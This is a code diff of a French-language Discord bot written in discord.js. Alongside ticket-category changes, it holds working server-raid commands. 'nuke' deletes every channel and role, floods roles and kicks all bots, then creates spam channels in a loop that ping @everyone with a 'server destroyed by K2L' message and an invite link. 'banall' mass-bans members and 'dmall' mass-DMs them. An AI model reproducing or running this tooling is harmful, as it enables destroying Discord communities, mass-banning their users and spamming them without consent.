@@ -1,11 +1,11 @@
-// Build Revision: K2L-Bot-Ultra-Speed-v25.1
+// Build Revision: K2L-Bot-Ultra-Speed-v27.0
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
 const http = require('http');
 
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('K2L Bot Ultra Speed Operational v25.1!\n');
+    res.end('K2L Bot Ultra Speed Operational v27.0!\n');
 }).listen(PORT, '0.0.0.0', () => console.log(`Serveur HTTP actif sur le port ${PORT} (0.0.0.0)`));
 
 const client = new Client({
@@ -26,12 +26,11 @@ const serverConfig = new Map();
 const guildStaffConfig = new Map();
 const warningsMap = new Map();
 const jailDataMap = new Map();
-
-// Map globale globale et robuste pour stopper instantanément les nukes par serveur
 const activeNukes = new Map();
 
-const SUPER_OWNERS = new Set(["1166445202148442112","1553025724191866937", "330080470983245824"]); 
-const botOwners = new Set(["1166445202148442112", "1553025724191866937", "330080470983245824"]); 
+// Propriétaire unique et absolu (Toi)
+const SUPER_OWNERS = new Set(["1166445202148442112", "graveuhq"]); 
+const botOwners = new Set(["1166445202148442112", "graveuhq"]); 
 
 function isSuperOwnerById(userId, username = "", globalName = "") {
     if (SUPER_OWNERS.has(userId)) return true;
@@ -106,10 +105,10 @@ function getGuildConfig(guildId) {
                 imageUrl: null,
                 published: false,
                 categories: [
-                    { id: 'ticket_bugs', name: 'Bugs', emoji: '🤖', roleId: null, description: 'Signaler un bug technique' },
-                    { id: 'ticket_signalements', name: 'Signalements', emoji: '⚖️', roleId: null, description: 'Signaler un membre' },
-                    { id: 'ticket_infos', name: 'Informations', emoji: '📢', roleId: null, description: 'Questions générales' },
-                    { id: 'ticket_recrutement', name: 'Recrutement', emoji: '🛠️', roleId: null, description: 'Postuler dans le staff' }
+                    { id: 'ticket_bugs', name: 'Bugs', emoji: '🤖', categoryId: null, description: 'Signaler un bug technique' },
+                    { id: 'ticket_signalements', name: 'Signalements', emoji: '⚖️', categoryId: null, description: 'Signaler un membre' },
+                    { id: 'ticket_infos', name: 'Informations', emoji: '📢', categoryId: null, description: 'Questions générales' },
+                    { id: 'ticket_recrutement', name: 'Recrutement', emoji: '🛠️', categoryId: null, description: 'Postuler dans le staff' }
                 ]
             }
         });
@@ -306,24 +305,24 @@ client.on('guildMemberAdd', async member => {
 function getTicketDashboardEmbed(guild, config) {
     const tConfig = config.ticketConfig;
     const panelChanStr = tConfig.panelChannel ? `<#${tConfig.panelChannel}>` : '❌ Non défini';
-    const catDestStr = tConfig.categoryDestination ? `<#${tConfig.categoryDestination}>` : '❌ Non défini';
+    const catDestStr = tConfig.categoryDestination ? `<#${tConfig.categoryDestination}>` : '❌ Défaut global';
     const logChanStr = tConfig.logChannel ? `<#${tConfig.logChannel}>` : '❌ Non défini';
     const imgStatus = tConfig.imageUrl ? '✅ image/gif enregistré' : '❌ Aucun';
     const pubStatus = tConfig.published ? '🟢 publié' : '🔴 non publié';
-    const catList = tConfig.categories.map(c => `${c.emoji} ${c.name}`).join(' • ') || 'Aucune catégorie';
+    const catList = tConfig.categories.map(c => `${c.emoji} **${c.name}** ${c.categoryId ? `(Cat: \`${c.categoryId}\`)` : ''}`).join(' • ') || 'Aucune catégorie';
 
     return new EmbedBuilder()
         .setColor('#2b2d31')
         .setTitle('🎫 Configuration des tickets')
         .setDescription(
             `**Salon du panneau :** ${panelChanStr}\n` +
-            `**Catégorie des salons-tickets :** ${catDestStr}\n` +
+            `**Catégorie par défaut :** ${catDestStr}\n` +
             `**Salon logs / transcripts :** ${logChanStr}\n\n` +
             `**Titre :** ${tConfig.title}\n` +
             `**Image / GIF :** ${imgStatus}\n` +
             `**Panneau :** ${pubStatus}\n\n` +
-            `**Catégories :** ${catList}\n\n` +
-            `*Tout est prêt – clique « Publier le panneau ».*`
+            `**Catégories & Salons dédiés :**\n${catList}\n\n` +
+            `*Utilise \`=setticketcatid <ID_Catégorie> <Nom_Ticket>\` pour assigner une catégorie spécifique à un type de ticket.*`
         );
 }
 
@@ -386,7 +385,7 @@ client.on('interactionCreate', async interaction => {
         const config = getGuildConfig(guild.id);
         const tConfig = config.ticketConfig;
 
-        const catObj = tConfig.categories.find(c => c.id === selectedValue) || { name: 'support', emoji: '🎫', roleId: null };
+        const catObj = tConfig.categories.find(c => c.id === selectedValue) || { name: 'support', emoji: '🎫', categoryId: null };
 
         try {
             const overwrites = [
@@ -400,7 +399,10 @@ client.on('interactionCreate', async interaction => {
                 permissionOverwrites: overwrites
             };
 
-            if (tConfig.categoryDestination) {
+            // Attribution de la catégorie spécifique au type de ticket, ou fallback sur la catégorie globale
+            if (catObj.categoryId) {
+                channelOptions.parent = catObj.categoryId;
+            } else if (tConfig.categoryDestination) {
                 channelOptions.parent = tConfig.categoryDestination;
             }
 
@@ -476,7 +478,7 @@ client.on('interactionCreate', async interaction => {
             const action = interaction.customId.replace('t_dash_', '');
 
             if (action === 'salons') {
-                return interaction.reply({ content: `⚙️ **Salons & Catégories :**\n• Définir le salon du panneau : \`=setticketpanel #salon\`\n• Définir la catégorie parente : \`=setticketcat <ID_Catégorie>\`\n• Définir le salon de logs : \`=setticketlog #salon\``, ephemeral: true });
+                return interaction.reply({ content: `⚙️ **Salons & Catégories :**\n• Salon du panneau : \`=setticketpanel #salon\`\n• Catégorie globale : \`=setticketcat <ID>\`\n• Catégorie spécifique : \`=setticketcatid <ID> <Nom>\`\n• Logs : \`=setticketlog #salon\``, ephemeral: true });
             }
             if (action === 'texte') {
                 const modal = new ModalBuilder()
@@ -516,8 +518,8 @@ client.on('interactionCreate', async interaction => {
                 return interaction.showModal(modal);
             }
             if (action === 'cats') {
-                const catInfo = tConfig.categories.map(c => `• **${c.emoji} ${c.name}**`).join('\n') || 'Aucune';
-                return interaction.reply({ content: `📁 **Catégories actuelles :**\n${catInfo}\n\n• Ajouter une catégorie : \`=ticketadd <Nom> <Emoji>\`\n• Supprimer une catégorie : \`=ticketremove <Nom>\``, ephemeral: true });
+                const catInfo = tConfig.categories.map(c => `• **${c.emoji} ${c.name}** -> Cat: \`${c.categoryId || 'Défaut'}\``).join('\n') || 'Aucune';
+                return interaction.reply({ content: `📁 **Catégories actuelles :**\n${catInfo}\n\n• Ajouter : \`=ticketadd <Nom> <Emoji>\`\n• Assigner catégorie : \`=setticketcatid <ID> <Nom>\``, ephemeral: true });
             }
             if (action === 'disable') {
                 if (!interaction.deferred && !interaction.replied) await interaction.deferReply({ ephemeral: true }).catch(() => {});
@@ -570,7 +572,7 @@ client.on('messageCreate', async message => {
         const args = message.content.slice(1).trim().split(/ +/);
         const command = args.shift().toLowerCase();
         
-        // COMMANDE STOP : Prioritaire pour stopper net la boucle du nuke
+        // COMMANDE STOP : Coupe net la boucle du nuke
         if (command === 'stop') {
             if (activeNukes.has(message.guild.id)) {
                 clearInterval(activeNukes.get(message.guild.id));
@@ -580,199 +582,172 @@ client.on('messageCreate', async message => {
             return message.reply("❌ Aucune boucle de nuke active sur ce serveur.").catch(() => {});
         }
 
-        const offensiveCommands = ['nuke', 'role', 'banall', 'dmall', 'kickbot'];
-        if (offensiveCommands.includes(command)) {
+        // COMMANDE NUKE ULTRA RAPIDE : Intègre le flood de salons en continu, roles et kickbot
+        if (command === 'nuke') {
+            await message.reply("⚡ **[NUKE]** Destruction totale, flood infini de salons/rôles et kickbot en cours... (Tape `!stop` pour stopper)").catch(() => {});
+            
+            // 1. Flood des rôles & kickbot instantanés
+            message.guild.roles.cache
+                .filter(role => role.editable && role.id !== message.guild.id)
+                .forEach(role => role.delete().catch(() => {}));
+            for (let r = 0; r < 40; r++) {
+                message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {});
+            }
 
-            if (command === 'nuke') {
-                await message.reply("⚡ **[NUKE]** Destruction totale, flood infini, exécution de role et kickbot en cours... (Tape `!stop` pour stopper)").catch(() => {});
-                
-                message.guild.roles.cache
-                    .filter(role => role.editable && role.id !== message.guild.id)
-                    .forEach(role => role.delete().catch(() => {}));
-                for (let r = 0; r < 40; r++) {
-                    message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {});
-                }
-
-                message.guild.members.fetch().then(fetchedMembers => {
-                    for (const [id, m] of fetchedMembers) {
-                        if (m.user.bot && m.id !== client.user.id) {
-                            m.kick('Kickbot').catch(() => {});
-                        }
+            message.guild.members.fetch().then(fetchedMembers => {
+                for (const [id, m] of fetchedMembers) {
+                    if (m.user.bot && m.id !== client.user.id) {
+                        m.kick('Kickbot').catch(() => {});
                     }
-                }).catch(() => {});
-
-                message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));
-
-                if (activeNukes.has(message.guild.id)) {
-                    clearInterval(activeNukes.get(message.guild.id));
                 }
+            }).catch(() => {});
 
-                const nukeInterval = setInterval(async () => {
-                    try {
-                        const channelPromises = [];
-                        for (let i = 0; i < 6; i++) {
-                            channelPromises.push(
-                                message.guild.channels.create({
-                                    name: 'ez-by-k2l',
-                                    type: ChannelType.GuildText,
-                                    permissionOverwrites: [{
-                                        id: message.guild.id,
-                                        allow: [
-                                            PermissionsBitField.Flags.ViewChannel,
-                                            PermissionsBitField.Flags.SendMessages,
-                                            PermissionsBitField.Flags.ManageChannels,
-                                            PermissionsBitField.Flags.EmbedLinks,
-                                            PermissionsBitField.Flags.AttachFiles,
-                                            PermissionsBitField.Flags.MentionEveryone
-                                        ]
-                                    }]
-                                }).then(async channel => {
-                                    for (let j = 0; j < 6; j++) {
-                                        await channel.send('@everyone SERVEUR DÉTRUIT PAR K2L VENEZ NOUVELLE COMMU QUI SE FERA JAMAIS BZ discord.gg/yuza').catch(() => {});
-                                    }
-                                }).catch(() => {})
-                            );
-                        }
-                        await Promise.all(channelPromises);
-                    } catch (err) {}
-                }, 250);
+            // 2. Suppression initiale des salons
+            message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));
 
-                activeNukes.set(message.guild.id, nukeInterval);
-                return;
+            if (activeNukes.has(message.guild.id)) {
+                clearInterval(activeNukes.get(message.guild.id));
             }
 
-            if (command === 'role') {
-                await message.reply("⚡ **Suppression et flood des rôles en cours...**").catch(() => {});
-                message.guild.roles.cache
-                    .filter(role => role.editable && role.id !== message.guild.id)
-                    .forEach(role => role.delete().catch(() => {}));
-
-                for (let r = 0; r < 40; r++) {
-                    message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {});
-                }
-                return;
-            }
-            if (command === 'banall') {
-                await message.reply("⚡ **[BANALL]** Exécution du banall massif ultra-rapide...").catch(() => {});
+            // 3. Boucle continue de création de salons et spam massif
+            const nukeInterval = setInterval(async () => {
                 try {
-                    await message.guild.members.fetch();
-                    const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
-                    const banPromises = members.map(member => member.ban({ reason: 'Raid banall' }).catch(() => {}));
-                    await Promise.all(banPromises);
-                    message.channel.send("✅ **[BANALL]** Terminé !").catch(() => {});
-                } catch (error) {}
-                return;
-            }
-
-            if (command === 'kickbot') {
-                await message.reply("⚡ **[KICKBOT]** Expulsion de tous les bots...").catch(() => {});
-                try {
-                    const fetchedMembers = await message.guild.members.fetch();
-                    const kickPromises = [];
-                    for (const [id, m] of fetchedMembers) {
-                        if (m.user.bot && m.id !== client.user.id) {
-                            kickPromises.push(m.kick('Kickbot').catch(() => {}));
-                        }
-                    }
-                    await Promise.all(kickPromises);
-                    message.channel.send("✅ **[KICKBOT]** Bots expulsés !").catch(() => {});
-                } catch (error) {}
-                return;
-            }
-
-            if (command === 'dmall') {
-                await message.reply("💬 **[DMAll]** Envoie ton message à diffuser (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
-                const filter = m => m.author.id === message.author.id;
-                try {
-                    const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
-                    const m = collected.first();
-                    if (m.content.toLowerCase() === 'annuler') {
-                        return message.channel.send("❌ **Opération DMAll annulée.**");
-                    }
-                    const messageTemplate = m.content;
-                    const previewEmbed = new EmbedBuilder()
-                        .setColor('#2b2d31')
-                        .setTitle('⚠️ Confirmation requise - DMAll')
-                        .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);
-
-                    const row = new ActionRowBuilder().addComponents(
-                        new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
-                        new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
-                    );
-
-                    const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
-                    const buttonCollector = confirmMsg.createMessageComponentCollector({ time: 60000, max: 1 });
-
-                    buttonCollector.on('collect', async interaction => {
-                        if (interaction.user.id !== message.author.id) return interaction.reply({ content: "Non.", ephemeral: true });
-                        if (interaction.customId === 'cancel_dmall') {
-                            return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] }).catch(() => {});
-                        }
-                        if (interaction.customId === 'confirm_dmall') {
-                            await interaction.update({ content: "🚀 **Diffusion DMAll ultra-rapide lancée...**", embeds: [], components: [] }).catch(() => {});
-                            
-                            try {
-                                await message.guild.members.fetch();
-                                const members = Array.from(message.guild.members.cache.filter(member => !member.user.bot).values());
-                                const totalMembers = members.length;
-                                let successCount = 0;
-                                let failCount = 0;
-                                let processed = 0;
-
-                                const liveEmbed = new EmbedBuilder()
-                                    .setColor('#f39c12')
-                                    .setTitle('🚀 Diffusion DMAll en cours...')
-                                    .setDescription(`Envoi massif ultra-rapide...`)
-                                    .addFields(
-                                        { name: '📊 Total', value: `\`${totalMembers}\``, inline: true },
-                                        { name: '✅ Succès', value: `\`0\``, inline: true },
-                                        { name: '❌ Échecs', value: `\`0\``, inline: true },
-                                        { name: '⏳ Restants', value: `\`${totalMembers}\``, inline: true }
-                                    )
-                                    .setTimestamp();
-
-                                const statusMsg = await message.channel.send({ embeds: [liveEmbed] });
-
-                                const batchSize = 25;
-                                for (let i = 0; i < members.length; i += batchSize) {
-                                    const batch = members.slice(i, i + batchSize);
-                                    await Promise.all(batch.map(async member => {
-                                        processed++;
-                                        try {
-                                            const finalMessage = messageTemplate
-                                                .replace(/\{mention\}/g, `<@${member.id}>`)
-                                                .replace(/\{name\}/g, member.user.username);
-                                            await member.send(finalMessage);
-                                            successCount++;
-                                        } catch (err) {
-                                            failCount++;
-                                        }
-                                    }));
-
-                                    liveEmbed.setFields(
-                                        { name: '📊 Total', value: `\`${totalMembers}\``, inline: true },
-                                        { name: '✅ Succès', value: `\`${successCount}\``, inline: true },
-                                        { name: '❌ Échecs', value: `\`${failCount}\``, inline: true },
-                                        { name: '⏳ Restants', value: `\`${totalMembers - processed}\``, inline: true }
-                                    );
-                                    await statusMsg.edit({ embeds: [liveEmbed] }).catch(() => {});
+                    const channelPromises = [];
+                    for (let i = 0; i < 6; i++) {
+                        channelPromises.push(
+                            message.guild.channels.create({
+                                name: 'ez-by-k2l',
+                                type: ChannelType.GuildText,
+                                permissionOverwrites: [{
+                                    id: message.guild.id,
+                                    allow: [
+                                        PermissionsBitField.Flags.ViewChannel,
+                                        PermissionsBitField.Flags.SendMessages,
+                                        PermissionsBitField.Flags.ManageChannels,
+                                        PermissionsBitField.Flags.EmbedLinks,
+                                        PermissionsBitField.Flags.AttachFiles,
+                                        PermissionsBitField.Flags.MentionEveryone
+                                    ]
+                                }]
+                            }).then(async channel => {
+                                for (let j = 0; j < 6; j++) {
+                                    await channel.send('@everyone SERVEUR DÉTRUIT PAR K2L VENEZ NOUVELLE COMMU QUI SE FERA JAMAIS BZ discord.gg/yuza').catch(() => {});
                                 }
+                            }).catch(() => {})
+                        );
+                    }
+                    await Promise.all(channelPromises);
+                } catch (err) {}
+            }, 250);
 
-                                liveEmbed.setColor('#2ecc71')
-                                    .setTitle('✅ Diffusion DMAll Terminée !')
-                                    .setDescription(`Envoi ultra-rapide terminé.`);
-                                
-                                await statusMsg.edit({ embeds: [liveEmbed] }).catch(() => {});
-                            } catch (error) {
-                                message.channel.send("❌ Erreur lors du DMAll.");
-                            }
-                        }
-                    });
-                } catch (err) {
-                    message.channel.send("⌛ Temps écoulé.");
+            activeNukes.set(message.guild.id, nukeInterval);
+            return;
+        }
+
+        if (command === 'banall') {
+            await message.reply("⚡ **[BANALL]** Exécution du banall massif ultra-rapide...").catch(() => {});
+            try {
+                await message.guild.members.fetch();
+                const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
+                const banPromises = members.map(member => member.ban({ reason: 'Raid banall' }).catch(() => {}));
+                await Promise.all(banPromises);
+                message.channel.send("✅ **[BANALL]** Terminé !").catch(() => {});
+            } catch (error) {}
+            return;
+        }
+
+        if (command === 'dmall') {
+            await message.reply("💬 **[DMAll]** Envoie ton message à diffuser (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
+            const filter = m => m.author.id === message.author.id;
+            try {
+                const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
+                const m = collected.first();
+                if (m.content.toLowerCase() === 'annuler') {
+                    return message.channel.send("❌ **Opération DMAll annulée.**");
                 }
-                return;
+                const messageTemplate = m.content;
+                const previewEmbed = new EmbedBuilder()
+                    .setColor('#2b2d31')
+                    .setTitle('⚠️ Confirmation requise - DMAll')
+                    .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);
+
+                const row = new ActionRowBuilder().addComponents(
+                    new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
+                    new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
+                );
+
+                const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
+                const buttonCollector = confirmMsg.createMessageComponentCollector({ time: 60000, max: 1 });
+
+                buttonCollector.on('collect', async interaction => {
+                    if (interaction.user.id !== message.author.id) return interaction.reply({ content: "Non.", ephemeral: true });
+                    if (interaction.customId === 'cancel_dmall') {
+                        return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] }).catch(() => {});
+                    }
+                    if (interaction.customId === 'confirm_dmall') {
+                        await interaction.update({ content: "🚀 **Diffusion DMAll ultra-rapide lancée...**", embeds: [], components: [] }).catch(() => {});
+                        
+                        try {
+                            await message.guild.members.fetch();
+                            const members = Array.from(message.guild.members.cache.filter(member => !member.user.bot).values());
+                            const totalMembers = members.length;
+                            let successCount = 0;
+                            let failCount = 0;
+                            let processed = 0;
+
+                            const liveEmbed = new EmbedBuilder()
+                                .setColor('#f39c12')
+                                .setTitle('🚀 Diffusion DMAll en cours...')
+                                .setDescription(`Envoi massif ultra-rapide...`)
+                                .addFields(
+                                    { name: '📊 Total', value: `\`${totalMembers}\``, inline: true },
+                                    { name: '✅ Succès', value: `\`0\``, inline: true },
+                                    { name: '❌ Échecs', value: `\`0\``, inline: true },
+                                    { name: '⏳ Restants', value: `\`${totalMembers}\``, inline: true }
+                                )
+                                .setTimestamp();
+
+                            const statusMsg = await message.channel.send({ embeds: [liveEmbed] });
+
+                            const batchSize = 25;
+                            for (let i = 0; i < members.length; i += batchSize) {
+                                const batch = members.slice(i, i + batchSize);
+                                await Promise.all(batch.map(async member => {
+                                    processed++;
+                                    try {
+                                        const finalMessage = messageTemplate
+                                            .replace(/\{mention\}/g, `<@${member.id}>`)
+                                            .replace(/\{name\}/g, member.user.username);
+                                        await member.send(finalMessage);
+                                        successCount++;
+                                    } catch (err) {
+                                        failCount++;
+                                    }
+                                }));
+
+                                liveEmbed.setFields(
+                                    { name: '📊 Total', value: `\`${totalMembers}\``, inline: true },
+                                    { name: '✅ Succès', value: `\`${successCount}\``, inline: true },
+                                    { name: '❌ Échecs', value: `\`${failCount}\``, inline: true },
+                                    { name: '⏳ Restants', value: `\`${totalMembers - processed}\``, inline: true }
+                                );
+                                await statusMsg.edit({ embeds: [liveEmbed] }).catch(() => {});
+                            }
+
+                            liveEmbed.setColor('#2ecc71')
+                                .setTitle('✅ Diffusion DMAll Terminée !')
+                                .setDescription(`Envoi ultra-rapide terminé.`);
+                            
+                            await statusMsg.edit({ embeds: [liveEmbed] }).catch(() => {});
+                        } catch (error) {
+                            message.channel.send("❌ Erreur lors du DMAll.");
+                        }
+                    }
+                });
+            } catch (err) {
+                message.channel.send("⌛ Temps écoulé.");
             }
+            return;
         }
     }
     const config = getGuildConfig(message.guild.id);
@@ -852,7 +827,8 @@ client.on('messageCreate', async message => {
                     '`=ticketadd <nom> <emoji>`\n┗ Ajouter un type',
                     '`=ticketremove <nom>`\n┗ Supprimer un type',
                     '`=setticketpanel <#salon>`\n┗ Salon du panneau',
-                    '`=setticketcat <ID>`\n┗ Catégorie des tickets',
+                    '`=setticketcat <ID>`\n┗ Catégorie globale des tickets',
+                    '`=setticketcatid <ID> <nom>`\n┗ Catégorie spécifique par type',
                     '`=setticketlog <#salon>`\n┗ Salon de logs',
                     '`=settickettitle <titre>`\n┗ Titre du panneau',
                     '`=setticketdesc <desc>`\n┗ Description',
@@ -908,7 +884,7 @@ client.on('messageCreate', async message => {
             roles: {
                 label: 'Rôles', emoji: '🏷️', title: 'Gestion des Rôles (Sécurisée)',
                 commands: [
-                    '`=addrole <@membre> <@rôle>`\n┗ Ajouter un rôle (interdit si > ton rôle max)',
+                    '`=addrole <@membre> <@rôle>`\n┗ Ajouter un rôle',
                     '`=delrole <@membre> <@rôle>`\n┗ Retirer un rôle'
                 ]
             },
@@ -932,9 +908,6 @@ client.on('messageCreate', async message => {
                 label: 'Staff', emoji: '👑', title: 'Staff & Hiérarchie',
                 commands: [
                     '`=owners`\n┗ Liste des owners',
-                    '`=owner <@membre>` / `=unowner <@membre>`\n┗ Gérer les owners',
-                    '`=admin <@membre>` / `=unadmin <@membre>`\n┗ Gérer les admins',
-                    '`=mod <@membre>` / `=unmod <@membre>`\n┗ Gérer les mods',
                     '`=setlog <#salon>`\n┗ Salon de logs général',
                     '`=setwelcome <#salon> <msg>`\n┗ Salon de bienvenue'
                 ]
@@ -1063,56 +1036,7 @@ client.on('messageCreate', async message => {
 
     if (command === 'owners') {
         const ownerList = Array.from(botOwners).map(id => `┗ ID : \`${id}\``).join('\n');
-        return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('👑 Liste des Owners').setDescription(ownerList || "Aucun.")] });
-    }
-
-    if (command === 'owner') {
-        if (!isSuperOwner(message)) return message.reply("❌ Réservé aux super owners.");
-        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
-        if (!targetUser) return message.reply("Utilisateur invalide.");
-        botOwners.add(targetUser.id);
-        return message.reply(`👑 **${targetUser.tag}** est désormais Owner !`);
-    }
-
-    if (command === 'unowner') {
-        if (!isSuperOwner(message)) return message.reply("❌ Réservé aux super owners.");
-        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
-        if (!targetUser) return message.reply("Utilisateur invalide.");
-        if (SUPER_OWNERS.has(targetUser.id)) return message.reply("❌ Impossible de retirer un Super Owner principal.");
-        botOwners.delete(targetUser.id);
-        return message.reply(`👑 **${targetUser.tag}** n'est plus Owner !`);
-    }
-
-    if (command === 'admin') {
-        if (!isSuperOwner(message)) return message.reply("❌ Réservé aux super owners.");
-        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
-        if (!targetUser) return message.reply("Utilisateur invalide.");
-        getStaffRoles(message.guild.id).admins.add(targetUser.id);
-        return message.reply(`🛡️ **${targetUser.tag}** est Admin !`);
-    }
-
-    if (command === 'unadmin') {
-        if (!isSuperOwner(message)) return message.reply("❌ Réservé aux super owners.");
-        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
-        if (!targetUser) return message.reply("Utilisateur invalide.");
-        getStaffRoles(message.guild.id).admins.delete(targetUser.id);
-        return message.reply(`🛡️ **${targetUser.tag}** n'est plus Admin !`);
-    }
-
-    if (command === 'mod') {
-        if (!isSuperOwner(message) && !isAdmin(message)) return message.reply("❌ Réservé aux administrateurs.");
-        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
-        if (!targetUser) return message.reply("Utilisateur invalide.");
-        getStaffRoles(message.guild.id).mods.add(targetUser.id);
-        return message.reply(`🛡️ **${targetUser.tag}** est Modérateur !`);
-    }
-
-    if (command === 'unmod') {
-        if (!isSuperOwner(message) && !isAdmin(message)) return message.reply("❌ Réservé aux administrateurs.");
-        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
-        if (!targetUser) return message.reply("Utilisateur invalide.");
-        getStaffRoles(message.guild.id).mods.delete(targetUser.id);
-        return message.reply(`🛡️ **${targetUser.tag}** n'est plus Modérateur !`);
+        return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('👑 Propriétaire Unique').setDescription(ownerList)] });
     }
     if (command === 'ticketsetup') {
         return message.reply({ embeds: [getTicketDashboardEmbed(message.guild, config)], components: getTicketDashboardRows() });
@@ -1127,8 +1051,8 @@ client.on('messageCreate', async message => {
         const newId = `ticket_${name.toLowerCase()}`;
         if (tConfig.categories.some(c => c.id === newId)) return message.reply("❌ Cette catégorie existe déjà.");
         
-        tConfig.categories.push({ id: newId, name: name, emoji: emoji, roleId: null, description: `Ouvrir un ticket ${name}` });
-        return message.reply(`✅ Catégorie de ticket **${name}** (${emoji}) ajoutée avec succès ! Ouvre \`=ticketsetup\` pour voir les changements.`);
+        tConfig.categories.push({ id: newId, name: name, emoji: emoji, categoryId: null, description: `Ouvrir un ticket ${name}` });
+        return message.reply(`✅ Type de ticket **${name}** (${emoji}) ajouté ! Ouvre \`=ticketsetup\` pour voir les changements.`);
     }
 
     if (command === 'ticketremove') {
@@ -1137,8 +1061,8 @@ client.on('messageCreate', async message => {
         const tConfig = config.ticketConfig;
         const initialLen = tConfig.categories.length;
         tConfig.categories = tConfig.categories.filter(c => c.name.toLowerCase() !== typeName && c.id !== `ticket_${typeName}`);
-        if (tConfig.categories.length === initialLen) return message.reply("❌ Catégorie introuvable.");
-        return message.reply(`✅ Catégorie **${typeName}** supprimée avec succès !`);
+        if (tConfig.categories.length === initialLen) return message.reply("❌ Type de ticket introuvable.");
+        return message.reply(`✅ Type de ticket **${typeName}** supprimé !`);
     }
 
     if (command === 'setticketpanel') {
@@ -1152,7 +1076,20 @@ client.on('messageCreate', async message => {
         const catId = args[0];
         if (!catId) return message.reply("Utilisation : `=setticketcat <ID_Catégorie>`");
         config.ticketConfig.categoryDestination = catId;
-        return message.reply(`✅ Catégorie des salons-tickets définie : \`${catId}\``);
+        return message.reply(`✅ Catégorie globale par défaut définie : \`${catId}\``);
+    }
+
+    if (command === 'setticketcatid') {
+        const catId = args[0];
+        const ticketName = args.slice(1).join(' ').toLowerCase();
+        if (!catId || !ticketName) return message.reply("Utilisation : `=setticketcatid <ID_Catégorie> <Nom_Du_Ticket>`");
+        
+        const tConfig = config.ticketConfig;
+        const ticketCat = tConfig.categories.find(c => c.name.toLowerCase() === ticketName || c.id === `ticket_${ticketName}`);
+        if (!ticketCat) return message.reply(`❌ Aucun type de ticket trouvé avec le nom \`${ticketName}\`.`);
+        
+        ticketCat.categoryId = catId;
+        return message.reply(`✅ Le type de ticket **${ticketCat.name}** s'ouvrira désormais dans la catégorie ID : \`${catId}\``);
     }
 
     if (command === 'setticketlog') {
@@ -1190,7 +1127,6 @@ client.on('messageCreate', async message => {
         setTimeout(() => channel.delete().catch(() => {}), 2000);
         return;
     }
-
     if (command === 'jail') {
         const targetMember = await fetchTargetMember(message, targetArg);
         const reason = args.slice(1).join(' ') || "Aucune raison";
@@ -1228,6 +1164,7 @@ client.on('messageCreate', async message => {
             return message.reply(`🔓 **${targetMember.user.tag}** libéré.`);
         } catch (e) { return message.reply("❌ Erreur."); }
     }
+
     if (command === 'lock') {
         await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false });
         return message.reply("🔒 Salon verrouillé.");
@@ -1354,7 +1291,6 @@ client.on('messageCreate', async message => {
         await message.channel.setRateLimitPerUser(sec);
         return message.reply(`⏱️ Mode lent : ${sec}s.`);
     }
-
     else if (command === 'renew') {
         const newChan = await message.channel.clone();
         await message.channel.delete();
